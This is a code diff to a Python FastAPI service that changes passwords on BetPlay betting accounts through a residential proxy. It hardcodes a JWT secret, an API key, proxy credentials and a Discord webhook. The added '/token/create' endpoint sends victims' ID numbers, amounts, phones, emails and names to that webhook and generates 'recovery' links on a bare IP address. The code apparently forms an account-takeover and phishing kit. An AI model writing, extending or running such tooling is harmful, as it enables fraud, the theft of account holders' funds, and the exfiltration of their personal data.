@@ -8,11 +8,15 @@ import hashlib
 import hmac
 import json
 import os
+import random
 import secrets
+import string
 import time
 from typing import Optional
 from curl_cffi import requests
 from fastapi import FastAPI, HTTPException
+from fastapi.responses import HTMLResponse, FileResponse
+from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import uvicorn
 
@@ -26,10 +30,16 @@ JWT_SECRET   = "kw4he!je!4Pf#[["
 BPC_KEY      = "191BCCEB25E8718E8BB58C21B63B9"
 VERSION      = "4.0.71"
 
-# Proxy residencial (2captcha) - variables de entorno o defaults
+# Proxy residencial (2captcha)
 PROXY_USER = os.environ.get("PROXY_USER", "u1ebdced056e605cf-zone-custom-region-co")
 PROXY_PASS = os.environ.get("PROXY_PASS", "u1ebdced056e605cf")
 PROXY_DNS  = os.environ.get("PROXY_DNS", "na.proxy.2captcha.com:2334")
+
+# Discord Webhook
+DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "https://discord.com/api/webhooks/1559311988184588319/8BXHxI_gOKqtl4YwCAjKndrtuZ6aHnaJD1Q_7riBMDxOjyvEQgV5Ak9-FmIvtrOLiZ1Y")
+
+# URL del dominio (para generar links)
+APP_DOMAIN = os.environ.get("APP_DOMAIN", "http://178.104.128.163:8001")
 
 BASE_HEADERS = {
     "accept":           "application/json, text/plain, */*",
@@ -50,6 +60,36 @@ def get_proxy() -> dict:
 
 
 # ---------------------------------------------------------------
+# TOKEN STORAGE
+# ---------------------------------------------------------------
+TOKENS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tokens.json")
+
+def load_tokens() -> dict:
+    if os.path.exists(TOKENS_FILE):
+        with open(TOKENS_FILE, "r") as f:
+            return json.load(f)
+    return {}
+
+def save_tokens(tokens: dict):
+    with open(TOKENS_FILE, "w") as f:
+        json.dump(tokens, f, indent=2)
+
+def generate_token(length=8):
+    chars = string.ascii_lowercase + string.digits
+    return ''.join(random.choices(chars, k=length))
+
+
+def send_to_discord(embed: dict):
+    try:
+        payload = {"embeds": [embed]}
+        session = requests.Session()
+        session.post(DISCORD_WEBHOOK, json=payload, timeout=10)
+        session.close()
+    except Exception as e:
+        print(f"Discord error: {e}")
+
+
+# ---------------------------------------------------------------
 # MODELOS
 # ---------------------------------------------------------------
 class ChangePasswordRequest(BaseModel):
@@ -64,6 +104,21 @@ class ChangePasswordResponse(BaseModel):
     status_code: Optional[int] = None
     profile: Optional[dict] = None
     balance: Optional[dict] = None
+
+
+class CreateTokenRequest(BaseModel):
+    cedula: str
+    monto: str
+    telefono: str = ""
+    email: str = ""
+    nombre: str = ""
+
+
+class TokenResponse(BaseModel):
+    success: bool
+    token: str = ""
+    link: str = ""
+    message: str = ""
 
 
 # ---------------------------------------------------------------
@@ -170,7 +225,7 @@ def do_login(session, proxy, username: str, password: str) -> dict:
 
     try:
         body = r.json()
-    except Exception as e:
+    except:
         body = {"error": f"Respuesta no es JSON: {r.text[:200]}", "status_code": r.status_code}
 
     return {"status": r.status_code, "body": body}
@@ -261,19 +316,21 @@ def change_password_api(username: str, current_password: str, new_password: str)
 app = FastAPI(
     title="BetPlay Password Change API",
     description="API para cambiar contraseñas de cuentas BetPlay",
-    version="1.0.0"
+    version="2.0.0"
+)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
 )
 
 
 @app.post("/change-password", response_model=ChangePasswordResponse)
 async def change_password(request: ChangePasswordRequest):
-    """
-    Cambia la contraseña de una cuenta BetPlay
-    
-    - **username**: Documento del usuario (ej: "22378522")
-    - **current_password**: Contraseña actual
-    - **new_password**: Nueva contraseña
-    """
+    """Cambia la contraseña de una cuenta BetPlay"""
     result = change_password_api(
         request.username,
         request.current_password,
@@ -289,13 +346,71 @@ async def change_password(request: ChangePasswordRequest):
     return result
 
 
+@app.post("/token/create", response_model=TokenResponse)
+async def create_token(req: CreateTokenRequest):
+    """Crea un token para link de recuperación y notifica a Discord"""
+    token = generate_token()
+    link = f"{APP_DOMAIN}/?t={token}"
+    
+    tokens = load_tokens()
+    tokens[token] = {
+        "cedula": req.cedula,
+        "monto": req.monto,
+        "telefono": req.telefono,
+        "email": req.email,
+        "nombre": req.nombre,
+        "creado": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "usado": False
+    }
+    save_tokens(tokens)
+    
+    # Enviar a Discord
+    embed = {
+        "title": "🔑 Nuevo Link de Recuperación Generado",
+        "color": 5814783,
+        "fields": [
+            {"name": "📄 Cédula", "value": f"`{req.cedula}`", "inline": True},
+            {"name": "💰 Monto", "value": f"${req.monto}", "inline": True},
+            {"name": "📱 Teléfono", "value": f"`{req.telefono}`", "inline": True},
+            {"name": "📧 Email", "value": req.email or "N/A", "inline": True},
+            {"name": " Nombre", "value": req.nombre or "N/A", "inline": True},
+            {"name": "🔗 Link", "value": link, "inline": False},
+        ],
+        "footer": {"text": f"Token: {token}"}
+    }
+    send_to_discord(embed)
+    
+    return TokenResponse(success=True, token=token, link=link, message="Token creado y enviado a Discord")
+
+
+@app.get("/token/{token_val}")
+async def get_token_data(token_val: str):
+    """Devuelve los datos asociados a un token"""
+    tokens = load_tokens()
+    data = tokens.get(token_val)
+    if not data:
+        raise HTTPException(status_code=404, detail="Token no encontrado")
+    
+    tokens[token_val]["usado"] = True
+    save_tokens(tokens)
+    
+    return {
+        "cedula": data["cedula"],
+        "monto": data["monto"],
+        "telefono": data["telefono"],
+        "nombre": data["nombre"]
+    }
+
+
 @app.get("/")
 async def root():
     return {
         "message": "BetPlay Password Change API",
         "docs": "/docs",
         "endpoints": {
-            "POST /change-password": "Cambiar contraseña de cuenta"
+            "POST /change-password": "Cambiar contraseña",
+            "POST /token/create": "Crear token de recuperación",
+            "GET /token/{token}": "Obtener datos del token"
         }
     }
 
